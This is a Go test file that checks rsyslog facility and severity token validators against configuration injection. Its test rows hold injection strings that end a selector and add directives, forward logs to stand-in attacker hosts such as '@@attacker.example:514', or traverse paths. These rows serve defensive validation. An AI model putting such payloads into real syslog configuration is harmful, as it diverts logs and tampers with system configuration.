package daemon

import (
	"math/rand"
	"strings"
	"testing"
)

// #5797 invariant 7, render-belt half.
//
// syslogDropinContents builds an rsyslog selector line
// `<facility>.<severity>\t<target>` from config tokens and writes it to a
// managed drop-in under /etc/rsyslog.d. #4902 belted the file NAME and the
// user TOKEN on that exact line but left the two SELECTOR tokens unchecked, so
// an rsyslog metacharacter in a facility/severity escaped the selector and
// injected configuration. syslogSelectorFacilitySafe /
// syslogSelectorSeveritySafe close that.
//
// SCOPE OF THIS FILE: it tests the PREDICATES in isolation, and that is not the
// same as testing the fix. The shipped protection is the two
// `if !syslogSelector...Safe(...)` guards at the render site; every test
// here stays green if both are deleted. syslog_selector_render_5797_test.go
// is what binds those call sites — do not treat this file as covering them.
//
// The belt is a SHAPE check on purpose. Deciding which facility NAMES are
// honoured means reconciling the Junos vocabulary (`authorization`, `kernel`,
// `interactive-commands`) against the BSD/rsyslog names the runtime maps
// (`auth`, `kern`) — an operator-visible mapping change deferred on #5797.
// TestSyslogSelectorTokenAcceptsJunosVocabulary_5797 pins that the belt does
// NOT pre-empt that decision by rejecting names the runtime cannot yet map.
//
// The shape is POSITION-AWARE. An earlier revision applied one byte-allowlist
// to both positions, which is necessarily the INTERSECTION of two different
// grammars and so dropped native syntax from each — see
// TestSyslogSelectorNativeSyntaxAccepted_6829 for what that cost and
// TestSyslogSelectorPositionsAreNotInterchangeable_6829 for why one predicate
// cannot serve both.

// TestSyslogSelectorTokenRejectsInjection_5797 is the fail-on-revert guard.
// Reverting either belt call site makes the corresponding destination render a
// drop-in built from these tokens.
//
// Every row is asserted against BOTH position predicates: these are structural
// escapes, and no rsyslog position accepts them.
func TestSyslogSelectorTokenRejectsInjection_5797(t *testing.T) {
	cases := []struct {
		name string
		tok  string
	}{
		// The motivating vector for #5797: a `;` ends the selector and what
		// follows is parsed by rsyslog as its own directive. This row is the
		// load-bearing one — it is the string that passes commit-check.
		{"statement separator", "daemon;*.*"},
		{"statement separator with action", "daemon;*.* /tmp/pwn"},
		// ISOLATED metacharacters. The two rows above carry a `;` AND a `*`
		// AND a `.` AND (in the second) a space, so each is rejected four times
		// over and a mutation admitting any ONE of those bytes leaves them
		// green — measured, not assumed: adding `case c == ';'` to
		// syslogSelectorAtomSafe left this whole test passing until these rows
		// existed. Every byte the belt rejects for structural reasons gets a
		// row where it is the ONLY unsafe byte, so each one binds on its own
		// instead of being masked by its neighbours.
		{"statement separator alone", "daemon;x"},
		{"statement separator between two real facilities", "auth;authpriv"},
		{"slash alone", "var/log/pwn"},
		{"wildcard glued to a name", "daemon*"},
		{"equals inside a facility", "daemon=info"},
		// A newline would end the line outright. Not reachable through the
		// config surface (the lexer folds it to a space) but rejected anyway.
		{"embedded newline", "daemon\n*.* @@attacker.example:514"},
		{"embedded CR", "daemon\r*.* /tmp/pwn"},
		// Selector grammar: the `.` already separates facility from priority.
		{"selector dot", "daemon.info"},
		{"colon action prefix", "daemon:omusrmsg:root"},
		// Whitespace splits the selector from its action field.
		{"space", "daemon info"},
		{"tab", "daemon\tinfo"},
		// Control bytes.
		{"NUL", "daemon\x00"},
		{"DEL", "daemon\x7f"},
		// Path traversal in a token that reaches a written file's content.
		{"slash", "../../etc/passwd"},
		// EMPTY LIST MEMBERS. The comma is admitted in the facility position
		// (see TestSyslogSelectorNativeSyntaxAccepted_6829), which makes
		// "is every member a real atom?" the load-bearing question rather than
		// "does the token contain a comma?". A malformed list must not ride in
		// on the comma's admission.
		{"trailing empty atom", "auth,"},
		{"leading empty atom", ",auth"},
		{"interior empty atom", "auth,,authpriv"},
		{"comma only", ","},
		// The comma is admitted PER ATOM, not as a blanket pass: a list whose
		// members are individually unsafe is still an injection. This is the row
		// that fails if the list check is written as "contains a comma -> safe".
		{"list member carries a statement separator", "auth,authpriv;*.* /tmp/pwn"},
		{"list member carries a space", "auth,authpriv @@collector.example:514"},
		{"list member is a wildcard-plus-payload", "auth,* /tmp/pwn"},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			if syslogSelectorFacilitySafe(c.tok) {
				t.Errorf("FACILITY token %q accepted as safe; it can escape the rsyslog "+
					"selector line and inject configuration (#5797)", c.tok)
			}
			if syslogSelectorSeveritySafe(c.tok) {
				t.Errorf("SEVERITY token %q accepted as safe; it can escape the rsyslog "+
					"selector line and inject configuration (#5797)", c.tok)
			}
		})
	}
}

// TestSyslogSelectorNativeSyntaxAccepted_6829 holds the rows an earlier
// revision of this file listed as UNSAFE, claiming each "can escape the rsyslog
// selector line and inject configuration". That claim was false for both, and
// asserting it cost real configurations.
//
// The render is `fmt.Sprintf("%s.%s", facility, severity)`. A whole-token `*`
// can therefore only ever produce `*.<severity>` — one byte, no room for an
// embedded payload — and `*` is rsyslog's own spelling for all facilities
// (rsyslog.conf(5): "an asterisk stands for all facilities or all priorities,
// depending on where it is used"). A comma list is likewise native: "you can
// specify multiple facilities with the same priority pattern in one statement
// using the comma operator". `auth,authpriv` renders `auth,authpriv.info`.
//
// Neither is exotic. Both pass SchemaValidate (the facility is the schema's
// unvalidated wildcard KEY) and compile verbatim, and both rendered a working
// drop-in before any belt existed — so rejecting them did not harden anything,
// it warned-and-reconciled-away a strict-commit-clean destination on upgrade.
//
// The empty-atom and payload-carrying rows in
// TestSyslogSelectorTokenRejectsInjection_5797 are the other half of this: the
// comma is admitted per atom, so admitting `auth,authpriv` does not admit
// `auth,authpriv;*.* /tmp/pwn`.
func TestSyslogSelectorNativeSyntaxAccepted_6829(t *testing.T) {
	t.Run("facility", func(t *testing.T) {
		for _, tok := range []string{
			// Whole-token wildcard.
			"*",
			// Comma lists, including the rsyslog documentation's own example
			// shape and a Junos-spelled pair the runtime cannot map.
			"auth,authpriv",
			"daemon,auth",
			"kern,user",
			"auth,authpriv,daemon",
			"authorization,interactive-commands",
			"local0,local1,local2,local3,local4,local5,local6,local7",
		} {
			if !syslogSelectorFacilitySafe(tok) {
				t.Errorf("native rsyslog facility syntax %q rejected. It cannot escape the "+
					"selector — the render is fmt.Sprintf(%q, facility, severity) — and it "+
					"passes commit-check, so rejecting it silently deletes a working "+
					"destination on upgrade (#5797/#6829)", tok, "%s.%s")
			}
		}
	})

	t.Run("severity", func(t *testing.T) {
		for _, tok := range []string{
			// Whole-token wildcard: `daemon.*`.
			"*",
			// rsyslog's priority modifiers (rsyslog.conf(5)): `=` for exactly
			// this priority, `!` to exclude, and the two combined.
			"=info",
			"!info",
			"!=info",
			"=emergency",
			"!=warning",
			// A modifier in front of the wildcard is constructible and inert.
			"!*",
			"=*",
		} {
			if !syslogSelectorSeveritySafe(tok) {
				t.Errorf("native rsyslog priority syntax %q rejected — these are the "+
					"documented `=`/`!`/`!=` modifiers and the `*` wildcard, none of which "+
					"can alter the structure of the rendered line (#5797/#6829)", tok)
			}
		}
	})
}

// TestSyslogSelectorPositionsAreNotInterchangeable_6829 is what makes this
// belt POSITION-aware rather than one predicate called twice. It is the test
// that fails if a later change collapses the two predicates back into one —
// in either direction, which a single-position test cannot do.
//
// rsyslog's two selector positions have genuinely different grammars:
//
//   - the comma operator is facility-side only. rsyslog.conf(5) specifies
//     multiple facilities "with the same priority pattern"; the priority is a
//     single keyword. Multiple priorities are written as `;`-joined selectors
//     (`kern.*;kern.!err`), and `;` is exactly what this belt rejects. So
//     `daemon.info,err` was never a valid selector and admitting it would widen
//     the accept set while recovering nothing.
//   - the `=`/`!`/`!=` modifiers are priority-side only. `!daemon.info` is not
//     a facility with a modifier; a leading `!` at the start of a sysklogd-format
//     LINE is the program-name filter (`!prog`), a different construct entirely.
//
// A union predicate would accept both everywhere; an intersection predicate
// (the earlier revision) accepts neither anywhere. Both are wrong, and this
// pins which side each belongs to.
func TestSyslogSelectorPositionsAreNotInterchangeable_6829(t *testing.T) {
	t.Run("comma lists are facility-only", func(t *testing.T) {
		for _, tok := range []string{"auth,authpriv", "kern,user", "daemon,auth"} {
			if !syslogSelectorFacilitySafe(tok) {
				t.Errorf("facility %q must be accepted: the comma operator is native here", tok)
			}
			if syslogSelectorSeveritySafe(tok) {
				t.Errorf("severity %q must be REJECTED: the comma operator is defined on the "+
					"facility side only, so this never rendered a valid selector. Accepting "+
					"it means the two positions share one predicate, which is the shape this "+
					"fix exists to replace (#6829)", tok)
			}
		}
		// The bare priority list, spelled without a facility.
		if syslogSelectorSeveritySafe("info,err") {
			t.Errorf("severity \"info,err\" accepted — rsyslog's priority position takes a " +
				"single keyword; multiple priorities are `;`-joined selectors, and `;` is " +
				"the byte this belt rejects (#6829)")
		}
	})

	t.Run("priority modifiers are severity-only", func(t *testing.T) {
		for _, tok := range []string{"=info", "!info", "!=info"} {
			if !syslogSelectorSeveritySafe(tok) {
				t.Errorf("severity %q must be accepted: `=`/`!`/`!=` are native priority "+
					"modifiers", tok)
			}
			if syslogSelectorFacilitySafe(tok) {
				t.Errorf("facility %q must be REJECTED: the modifiers belong to the priority "+
					"position, and a leading `!` at the start of a sysklogd-format line is the "+
					"program-name filter, not a facility (#6829)", tok)
			}
		}
	})

	t.Run("a bare modifier names no priority", func(t *testing.T) {
		// Stripping the prefix must leave a real atom behind. `!`, `=` and `!=`
		// alone leave nothing, and an empty priority is not a selector.
		for _, tok := range []string{"!", "=", "!="} {
			if syslogSelectorSeveritySafe(tok) {
				t.Errorf("severity %q accepted: the modifier prefix was stripped and nothing "+
					"was checked behind it, so an empty priority renders `daemon.%s` (#6829)",
					tok, tok)
			}
		}
		// rsyslog.conf(5): "the exclamation mark must occur before the equals
		// sign". Only the three legal prefixes are stripped, so the illegal
		// ordering falls through to the atom check and is rejected for free.
		if syslogSelectorSeveritySafe("=!info") {
			t.Errorf("severity \"=!info\" accepted — rsyslog requires the exclamation mark " +
				"BEFORE the equals sign, so this ordering is not valid syntax (#6829)")
		}
	})
}

// TestSyslogSelectorTokenAcceptsJunosVocabulary_5797 is the over-rejection
// guard. It is the reason this belt is a shape check: it must accept every
// legitimate Junos facility/severity spelling — INCLUDING the Junos names the
// runtime does not yet map to a numeric facility — so the belt cannot silently
// pre-empt the deferred mapping decision by dropping valid destinations.
func TestSyslogSelectorTokenAcceptsJunosVocabulary_5797(t *testing.T) {
	safe := []string{
		// Empty: both call sites map it to the `*` wildcard, so it is ordinary
		// configuration rather than an omission.
		"",
		// Facilities the runtime maps today.
		"kern", "user", "daemon", "auth", "syslog", "change-log",
		"local0", "local1", "local2", "local3", "local4", "local5", "local6", "local7",
		// Junos facility names the runtime does NOT yet map. These must still
		// render — rejecting them here would turn a deferred mapping decision
		// into a silent loss of the destination.
		"authorization", "kernel", "interactive-commands", "conflict-log",
		"pfe", "security", "firewall", "external", "ftp", "ntp", "dfc",
		// Severities.
		"any", "none", "emergency", "alert", "critical",
		"error", "warning", "notice", "info", "debug",
		// Safe-shaped names that belong to NO vocabulary listed above, present
		// so a "hardcoded set of exactly the fixtures above" implementation
		// fails here. See TestSyslogSelectorTokenIsAShapeNotAList_5797 for the
		// form of that argument that a fixture cannot be added to.
		"audit-log", "local8", "vendor-specific-9",
	}
	for _, tok := range safe {
		if !syslogSelectorFacilitySafe(tok) {
			t.Errorf("legitimate syslog FACILITY token %q rejected — the belt is scoped "+
				"wider than the injection surface it guards", tok)
		}
		if !syslogSelectorSeveritySafe(tok) {
			t.Errorf("legitimate syslog SEVERITY token %q rejected — the belt is scoped "+
				"wider than the injection surface it guards", tok)
		}
	}
}

// TestSyslogSelectorTokenIsAShapeNotAList_5797 closes the blind spot the
// fixture list above cannot close on its own. Every name written into a fixture
// list becomes part of that list, so "accepts the Junos vocabulary" is equally
// satisfied by a hardcoded set containing exactly those names — an
// implementation that would then reject the next safe-shaped facility somebody
// configures, silently dropping their destination. That failure mode is this
// issue's own history: the accept set IS the decision.
//
// This pins the predicates as a SHAPE rather than a membership test, in the one
// form no fixture can be retrofitted into:
//
//   - exhaustively over all 256 byte values, for the ATOM and for each POSITION
//     — a set-membership implementation fails on the first unlisted letter;
//   - over randomly generated safe-shaped tokens, which by construction are
//     not in any list a maintainer could have written.
//
// It is deliberately a restatement of the accept CLASS, because that class is
// the security decision: everything in it is inert inside an rsyslog selector,
// everything outside it can alter the line's structure.
func TestSyslogSelectorTokenIsAShapeNotAList_5797(t *testing.T) {
	const accepted = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-"

	// The ATOM: one facility name, or one priority name. No positional syntax.
	for b := 0; b < 256; b++ {
		tok := string([]byte{byte(b)})
		want := strings.ContainsRune(accepted, rune(b))
		if got := syslogSelectorAtomSafe(tok); got != want {
			if want {
				t.Errorf("atom byte %#x (%q) rejected: the belt is a membership test, not a shape "+
					"check — the next safe-shaped facility an operator writes will be dropped", b, tok)
			} else {
				t.Errorf("atom byte %#x (%q) accepted: it can alter the structure of the rendered "+
					"rsyslog selector line", b, tok)
			}
		}
	}

	// Each POSITION: the atom class plus exactly one extra byte, `*`. Pinning
	// this exhaustively is what stops the positional relaxation from being
	// widened by one more metacharacter later — `;`, `.`, `:` and the space all
	// have to stay out, in both positions, and this fails on the first one
	// admitted.
	for b := 0; b < 256; b++ {
		tok := string([]byte{byte(b)})
		want := strings.ContainsRune(accepted, rune(b)) || b == '*'
		if got := syslogSelectorFacilitySafe(tok); got != want {
			t.Errorf("facility byte %#x (%q) = %v, want %v — the facility position accepts the "+
				"atom class plus the whole-token `*` wildcard, and nothing else", b, tok, got, want)
		}
		if got := syslogSelectorSeveritySafe(tok); got != want {
			t.Errorf("severity byte %#x (%q) = %v, want %v — the priority position accepts the "+
				"atom class plus the `*` wildcard; the `=`/`!` modifiers are prefixes and name "+
				"no priority on their own", b, tok, got, want)
		}
	}

	// Randomly generated safe-shaped tokens. Fixed seed: a failure is
	// reproducible, and the corpus is still outside any hand-written list.
	rng := rand.New(rand.NewSource(5797))
	for i := 0; i < 500; i++ {
		n := 1 + rng.Intn(24)
		var sb strings.Builder
		for j := 0; j < n; j++ {
			sb.WriteByte(accepted[rng.Intn(len(accepted))])
		}
		tok := sb.String()
		if !syslogSelectorAtomSafe(tok) {
			t.Fatalf("generated safe-shaped atom %q rejected — the belt cannot be a list of "+
				"known facility names; it must accept the whole [A-Za-z0-9-] shape", tok)
		}
		if !syslogSelectorFacilitySafe(tok) || !syslogSelectorSeveritySafe(tok) {
			t.Fatalf("generated safe-shaped token %q rejected by a position predicate", tok)
		}
		// The same corpus assembled into a comma list must survive the facility
		// position: the list rule is per-atom, so anything the atom accepts a
		// list of those atoms accepts too.
		if list := tok + "," + tok; !syslogSelectorFacilitySafe(list) {
			t.Fatalf("generated safe-shaped facility list %q rejected — the comma operator is "+
				"native rsyslog and the members are individually safe", list)
		}
	}
}

// TestSyslogSelectorTokenSpaceIsUnsafe_5797 pins the specific byte the
// reachability trace turned on. A literal newline cannot reach these tokens —
// the lexer normalizes \n and \t inside a quoted value to a SPACE — so the
// belt's value does not rest on newline rejection. It rests on rejecting the
// space, because the emitted line is `<facility>.<severity>\t<target>` and
// rsyslog's grammar is `<selector><whitespace><action>`: a space inside the
// token is what lets attacker-chosen text reach the ACTION position.
//
// If a future edit relaxes this to "printable ASCII" or "no control bytes",
// the belt still rejects newlines (which were never reachable) while admitting
// the space (which is), i.e. it would look correct and guard nothing. This
// test fails on exactly that relaxation, in both positions.
func TestSyslogSelectorTokenSpaceIsUnsafe_5797(t *testing.T) {
	for _, tok := range []string{
		"daemon local7",
		"* @@collector.example:514",
		"info *.* @@evil:514",
		" ",
		"daemon ",
		// The space must not ride in on either positional relaxation: not as a
		// comma-list member, and not behind a priority modifier.
		"auth,authpriv @@collector.example:514",
		"=info @@collector.example:514",
		"!info /tmp/pwn",
	} {
		if syslogSelectorFacilitySafe(tok) {
			t.Errorf("FACILITY token %q accepted: a SPACE separates the rsyslog selector from "+
				"its action, so this reaches the action position of a managed drop-in. The "+
				"newline this belt appears to guard is NOT reachable (the lexer folds it "+
				"to a space) — the space is the live byte (#5797)", tok)
		}
		if syslogSelectorSeveritySafe(tok) {
			t.Errorf("SEVERITY token %q accepted: a SPACE reaches the action position of a "+
				"managed drop-in (#5797)", tok)
		}
	}
}
